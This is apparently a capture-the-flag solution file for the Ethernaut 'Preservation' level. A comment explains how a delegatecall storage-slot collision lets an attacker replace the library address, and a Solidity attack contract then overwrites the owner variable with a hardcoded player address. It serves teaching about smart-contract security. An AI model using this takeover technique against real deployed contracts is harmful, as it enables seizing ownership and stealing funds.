// # Ethernaut 16: Preservation
//
// The `LibraryContract` which the `Preservation` instance initially uses does not
// mirror `Preservation`'s storage structure: The only storage variable in `LibraryContract`
// is `storedTime` in slot 0, which is occupied by `timeZone1Library` in `Preservation`.
//
// Because `Preservation` calls `LibraryContract.setTime` using `delegatecall`, this
// allows us to overwrite `timeZone1Library` with the attack contract's address.
//
// The attack contract's own `setTime` function is in turn called using `delegatecall`.
// Because it mirrors the caller's storage structure correctly, it can simply set the
// `owner` variable to the desired value.

pragma solidity ^0.6.0;

import "./16_Preservation.sol";

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    address constant player = 0xce45a59E18793C44018F15ECC84c1cDAebA69ad7;

    function setTime(uint _time) public {
        storedTime = _time;
        owner = player;
    }
}
